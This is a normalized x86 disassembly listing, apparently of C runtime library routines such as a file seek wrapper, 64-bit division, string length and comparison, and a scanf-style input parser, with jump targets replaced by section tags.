push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_2009d98
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_2014b04
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_202251a
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_200fb13
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_200fb39
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_2014b79
push 0x10
push r--data
call sub_200db54
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_200fb26
and [ eax ] 0x0
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] edi
call sub_200fb13
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_200db99
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_2022591
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_200fb13
mov [ eax ] 0x9
call sub_200fb26
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2014b04
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2014c4b
mov eax [ ebp - 0x1c ]
sub_2014c60
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_2014cd0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_2014d31
mov edi edi
push ebp
mov ebp esp
push ebx
mov bl [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
mov al [ esi + 0x8 ]
cmp al 0x70
je r-xdata
xor ecx ecx
cmp al bl
sete cl
mov eax ecx
cmp bl 0x70
je r-xdata
cmp al 0x73
je r-xdata
xor edx edx
inc edx
cmp al 0x53
je r-xdata
xor ecx ecx
inc ecx
cmp bl 0x53
je r-xdata
xor edx edx
jmp r-xdata
cmp edx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x73
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ebp + 0x14 ]
mov eax 0x810
and ecx eax
neg ecx
sbb ecx ecx
and edx eax
neg ecx
neg edx
sbb edx edx
neg edx
cmp ecx edx
jne r-xdata
mov dl 0x64
cmp al dl
je r-xdata
test edx edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
xor eax eax
inc eax
jmp r-xdata
xor ecx ecx
inc ecx
cmp al 0x69
je r-xdata
xor eax eax
inc eax
cmp bl 0x69
je r-xdata
cmp al dl
je r-xdata
cmp al 0x6f
je r-xdata
mov eax [ esi + 0xc ]
mov ecx eax
xor ecx [ ebp + 0x14 ]
test ecx 0x10000
jne r-xdata
cmp bl 0x6f
je r-xdata
cmp al 0x69
je r-xdata
cmp al 0x75
je r-xdata
xor eax [ ebp + 0x14 ]
test al 0x20
jne r-xdata
cmp bl 0x75
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x78
je r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
sete al
jmp r-xdata
cmp bl 0x78
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x58
je r-xdata
cmp al 0x78
je r-xdata
cmp bl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp al 0x58
je r-xdata
cmp bl 0x69
je r-xdata
cmp ecx eax
jne r-xdata
xor ecx ecx
jmp r-xdata
cmp bl 0x6f
je r-xdata
cmp bl dl
je r-xdata
cmp bl 0x75
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x58
jne r-xdata
sub_2014e71
mov edi edi
push ebp
mov ebp esp
sub esp 0x8d0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
xor edi edi
lea ecx [ ebp - 0x23c ]
mov [ ebp - 0x270 ] esi
mov [ ebp - 0x214 ] eax
mov [ ebp - 0x274 ] edi
mov [ ebp - 0x210 ] edi
mov [ ebp - 0x258 ] edi
mov [ ebp - 0x278 ] edi
mov [ ebp - 0x260 ] edi
call sub_20099ee
or [ ebp - 0x224 ] 0xffffffff
mov [ ebp - 0x25c ] edi
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_200fb13
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
cmp [ ebp - 0x230 ] 0x0
je r-xdata
cmp ebx edi
je r-xdata
push esi
call sub_20134c9
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x234 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x240 ] edi
mov [ ebp - 0x290 ] ebx
mov [ ebp - 0x228 ] edi
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
mov eax [ ebp - 0x290 ]
or [ ebp - 0x254 ] 0xffffffff
or [ ebp - 0x218 ] 0xffffffff
or [ ebp - 0x224 ] 0xffffffff
mov [ ebp - 0x268 ] edi
mov dl [ eax ]
mov [ ebp - 0x264 ] edi
mov [ ebp - 0x27c ] edi
mov [ ebp - 0x250 ] edi
mov [ ebp - 0x220 ] edi
mov [ ebp - 0x22c ] dl
test dl dl
je r-xdata
cmp [ ebp - 0x224 ] edi
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
inc [ ebp - 0x228 ]
cmp [ ebp - 0x228 ] 0x2
jge r-xdata
mov esi eax
jmp r-xdata
cmp [ ebp - 0x230 ] 0x0
je r-xdata
xor edi edi
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor edi edi
jmp r-xdata
inc esi
xor edi edi
cmp [ ebp - 0x240 ] edi
mov [ ebp - 0x244 ] esi
jl r-xdata
mov eax [ ebp - 0x240 ]
mov eax [ ebp - 0x234 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x228 ] 0x1
jne r-xdata
cmp [ ebp - 0x264 ] edi
je r-xdata
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
cmp [ ebp - 0x224 ] 0x1
jne r-xdata
cmp [ ebp - 0x264 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
cmp [ ebp - 0x228 ] edi
jne r-xdata
cmp eax 0x8
je r-xdata
cmp [ esi ] 0x25
je r-xdata
mov ecx [ ebp - 0x264 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
xor ebx ebx
shr eax 0x4
inc ebx
mov [ ebp - 0x264 ] eax
cmp eax ebx
jne r-xdata
xor esi esi
cmp [ ebp - 0x254 ] edi
jl r-xdata
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x264 ]
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x224 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x214 ]
lea eax [ ebp - 0x8cc ]
mov esi [ ebp - 0x244 ]
mov al [ esi ]
mov [ ebp - 0x22c ] al
test al al
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x224 ] ebx
jne r-xdata
push 0xa
lea eax [ ebp - 0x25c ]
push eax
push esi
call sub_201221d
add esp 0xc
test eax eax
jle r-xdata
mov [ eax ] edx
add edx 0x4
dec ecx
je r-xdata
mov dl [ ebp - 0x22c ]
xor edi edi
push 0xa
lea eax [ ebp - 0x25c ]
push eax
push esi
call sub_201221d
mov ecx [ ebp - 0x25c ]
add esp 0xc
dec eax
lea edx [ ecx + 0x1 ]
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x244 ] edx
cmp [ ebp - 0x228 ] edi
jne r-xdata
mov dl [ ebp - 0x22c ]
mov [ ebp - 0x224 ] edi
mov eax [ ebp - 0x25c ]
cmp [ eax ] 0x24
jne r-xdata
mov ecx [ eax - 0x4 ]
dec ecx
je r-xdata
dec ecx
je r-xdata
mov esi edx
mov dl [ ebp - 0x22c ]
cmp eax edi
jl r-xdata
cmp [ ebp - 0x228 ] edi
jne r-xdata
dec ecx
je r-xdata
cmp [ ecx ] 0x24
jne r-xdata
mov [ ebp - 0x224 ] ebx
jmp r-xdata
push 0x640
lea eax [ ebp - 0x8d0 ]
push edi
push eax
call sub_2013580
add esp 0xc
mov [ eax ] edx
add edx 0x8
jmp r-xdata
dec ecx
je r-xdata
cmp eax 0x64
jge r-xdata
inc esi
add eax 0x10
cmp esi [ ebp - 0x254 ]
mov [ ebp - 0x214 ] edx
jle r-xdata
dec ecx
je r-xdata
cmp eax [ ebp - 0x254 ]
jle r-xdata
dec ecx
dec ecx
jne r-xdata
mov [ ebp - 0x254 ] eax
sub_2016140
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_2016206
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1ac ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] esi
mov [ ebp - 0x1e8 ] esi
mov [ ebp - 0x188 ] esi
cmp edi esi
jne r-xdata
cmp eax esi
je r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_200b53e
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1f8 ]
call sub_20099ee
mov al [ edi ]
mov [ ebp - 0x19d ] 0x0
mov [ ebp - 0x18c ] esi
mov [ ebp - 0x1c4 ] esi
test al al
je r-xdata
push eax
call sub_20134c9
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
mov esi [ ebp - 0x19c ]
movzx eax al
push eax
call sub_2023541
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1f0 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
dec [ ebp - 0x18c ]
push esi
push esi
lea esi [ ebp - 0x18c ]
call sub_201723a
pop ecx
push eax
call sub_20161f3
pop ecx
pop ecx
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_20161dd
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x1b8 ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_2023541
pop ecx
test eax eax
jne r-xdata
jmp r-xdata
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
push esi
push ebx
jmp r-xdata
movzx eax bl
push eax
call sub_20145cd
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor esi esi
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1a8 ] esi
mov [ ebp - 0x1b4 ] esi
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x19f ] 0x0
mov [ ebp - 0x1a0 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1ad ] 0x0
mov [ ebp - 0x19e ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x1d8 ] esi
mov al [ edi ]
test al al
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_20161f3
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_20161dd
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1b8 ] edi
cmp ecx eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x25
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x194 ]
inc [ ebp - 0x1b4 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x194 ] eax
jmp r-xdata
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
cmp [ edi ] 0x25
jne r-xdata
push esi
push eax
call sub_20161f3
push esi
push ebx
call sub_20161f3
add esp 0x10
dec [ ebp - 0x18c ]
mov edi eax
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x1ad ] 0x0
je r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1ac ]
call sub_2009d98
pop ecx
mov eax [ ebp - 0x1b8 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0x195 ]
dec [ ebp - 0x18d ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_202343c
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b8 ] edi
jne r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e4 ]
mov esi [ eax ]
mov [ ebp - 0x1fc ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
cmp [ ebp - 0x19d ] al
jne r-xdata
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] esi
jmp r-xdata
inc [ ebp - 0x195 ]
inc [ ebp - 0x18d ]
jmp r-xdata
inc [ ebp - 0x1ad ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx eax [ edi ]
or eax 0x20
mov [ ebp - 0x1a4 ] eax
cmp eax 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
xor bl bl
mov [ ebp - 0x1bc ] esi
cmp [ ebp - 0x18d ] bl
jne r-xdata
mov ecx [ ebp - 0x1f0 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b4 ]
test ecx ecx
je r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x18d ] 0x1
mov [ ebp - 0x18d ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x195 ]
jmp r-xdata
mov eax [ ebp - 0x1a4 ]
cmp eax 0x6f
jg r-xdata
cmp [ ebp - 0x194 ] 0x0
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
cmp eax 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
sub eax 0x70
je r-xdata
je r-xdata
push [ ebp - 0x19c ]
push [ ebp - 0x188 ]
mov esi [ ebp - 0x1bc ]
mov edi [ ebp - 0x1b8 ]
push [ ebp - 0x19c ]
lea esi [ ebp - 0x18c ]
call sub_201723a
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x195 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop edx
cmp eax edx
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
mov edi [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push edi
push [ ebp - 0x188 ]
mov [ ebp - 0x1c0 ] esi
call sub_20161f3
pop ecx
pop ecx
mov [ ebp - 0x19e ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x194 ]
mov [ ebp - 0x1b4 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
mov edi [ ebp - 0x1c0 ]
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_20161dd
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x188 ]
jne r-xdata
cmp eax 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a0 ] 0x0
mov edi [ ebp - 0x1c0 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
mov bl 0x1
jmp r-xdata
dec [ ebp - 0x18c ]
push edi
push eax
call sub_20161f3
pop ecx
pop ecx
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
cmp [ ebp - 0x1c0 ] esi
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec [ ebp - 0x19d ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x69
je r-xdata
cmp [ ebp - 0x1a4 ] 0x46
jne r-xdata
neg edi
movzx eax [ ebp - 0x188 ]
push eax
call sub_20234c0
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1cc ]
mov ecx [ ebp - 0x1c8 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1cc ] eax
mov [ ebp - 0x1c8 ] ecx
jmp r-xdata
movzx eax [ ebp - 0x188 ]
push eax
call sub_20234c0
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x1a4 ] 0x73
jne r-xdata
push 0x30
pop esi
cmp [ ebp - 0x188 ] esi
jne r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
inc edi
cmp [ edi ] 0x5e
mov esi edi
jne r-xdata
mov [ ebp - 0x19e ] 0x1
mov edi [ ebp - 0x1b8 ]
inc [ ebp - 0x19d ]
inc edi
mov [ ebp - 0x1b8 ] edi
jmp r-xdata
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1a4 ] edx
cmp eax 0x6e
jne r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
and [ ebp - 0x1a8 ] 0x0
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_20161f3
pop ecx
pop ecx
push [ ebp - 0x188 ]
shl edi 0x4
call sub_201721a
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_202343c
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_20161f3
pop ecx
pop ecx
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
push [ ebp - 0x188 ]
shld edi esi 0x4
shl esi 0x4
call sub_201721a
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_202343c
pop ecx
test eax eax
je r-xdata
inc [ ebp - 0x1c4 ]
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
inc [ ebp - 0x1c0 ]
jmp r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
cmp al 0x78
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_2013580
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x1 ]
mov [ ebp - 0x19f ] 0xff
cmp [ ebp - 0x1b4 ] 0x0
jne r-xdata
dec [ ebp - 0x194 ]
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
cmp [ ebp - 0x196 ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_20145cd
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x19f ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_20161dd
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x188 ] eax
je r-xdata
cmp al 0x58
je r-xdata
mov bl 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
or [ ebp - 0x194 ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c4 ]
mov esi [ ebp - 0x1bc ]
imul edi edi 0xa
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c8 ]
push [ ebp - 0x1cc ]
call sub_2021790
mov esi eax
mov edi edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
lea eax [ ebp - 0x1f8 ]
push eax
mov eax [ ebp - 0x1f8 ]
mov [ ebp - 0x1e8 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
call sub_2022c57
mov ax [ ebp - 0x1e8 ]
add esp 0x10
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_20161dd
mov [ ebp - 0x1df ] al
mov [ ebp - 0x1a4 ] 0x78
jmp r-xdata
sub [ ebp - 0x194 ] 0x2
cmp [ ebp - 0x194 ] 0x1
jge r-xdata
